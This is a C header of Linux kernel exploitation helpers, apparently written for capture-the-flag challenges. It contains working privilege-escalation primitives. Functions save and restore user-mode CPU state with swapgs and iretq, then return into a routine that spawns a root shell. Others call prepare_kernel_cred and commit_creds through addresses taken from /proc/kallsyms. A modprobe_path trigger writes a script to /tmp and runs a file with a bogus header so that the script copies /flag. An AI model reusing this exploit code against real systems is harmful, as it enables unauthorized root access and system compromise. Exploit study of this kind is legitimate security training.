#ifndef __SNIPPET_H__
#define __SNIPPET_H__

#include "common.h"

int devfd = -1;

void write_to_dev(char *buf, i32 sz) {
    act("write 0x%x byte to dev from buf %p", sz, (void *)buf);
    int r = write(devfd, buf, sz);
    if(r != sz)
        panic("write");
}

void read_from_dev(char *buf, i32 sz) {
    act("read 0x%x byte from dev to buf %p", sz, (void *)buf);
    int r = read(devfd, buf, sz);
    if(r != sz)
        panic("read");
}

void open_dev(const char *dev, int oflag) {
    devfd = open(dev, oflag);
    if(devfd == -1)
        panic("open %s failed", dev);
}

u64 _cs, _ss, _sp, _rflags;

void save_state() {

    asm volatile (
        ".intel_syntax noprefix;"
        "mov _cs, cs;"
        "mov _ss, ss;"
        "mov _sp, rsp;"
        "pushf;"
        "pop _rflags;"
        ".att_syntax;"
    );

  ok("save_state done");
}

void get_root_shell() {

    if(getuid() == 0) {
        ok("root now");
        system("/bin/sh");
    }else {
        fatal("escalate failed");
    }
}

static void restore_state() {
    /*
    k_rsp -> u_rip
             u_cs
             u_rflags
             u_rsp
             u_ss
    */
    assert_neq(_sp, 0);
    asm volatile(
        ".intel_syntax noprefix;"
        "swapgs;"
        "mov qword ptr [rsp+0x20], %0;"
        "mov qword ptr [rsp+0x18], %1;"
        "mov qword ptr [rsp+0x10], %2;"
        "mov qword ptr [rsp+0x08], %3;"
        "mov qword ptr [rsp+0x00], %4;"
        "iretq;"
        ".att_syntax;"
        : 
        : "r"(_ss),
          "r"(_sp),
          "r"(_rflags),
          "r"(_cs),
          "r"(get_root_shell)
    );
    ok("restore_state done");
}
void get_root(u64 pkc, u64 cc) {
    /*
        / # grep prepare_kernel_cred /proc/kallsyms 
        / # grep commit_cred /proc/kallsyms 
    */
    (* (int * (*)(void *))cc)((* (void *(*)(void *))pkc)(NULL));
    restore_state();
}

void trigger_modprobe(){
    act("try to trigger modprobe");

    system(
      "echo '#!/bin/sh\n"
      "cp /flag /tmp/flag\n"
      "chmod 777 /tmp/flag' > /tmp/s\n"
    );
    system("chmod +x /tmp/s");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    act("try to run unknown file");
    system("/tmp/dummy");
    system("cat /tmp/flag");
    exit(0);
}
#endif /* __SNIPPET_H__ */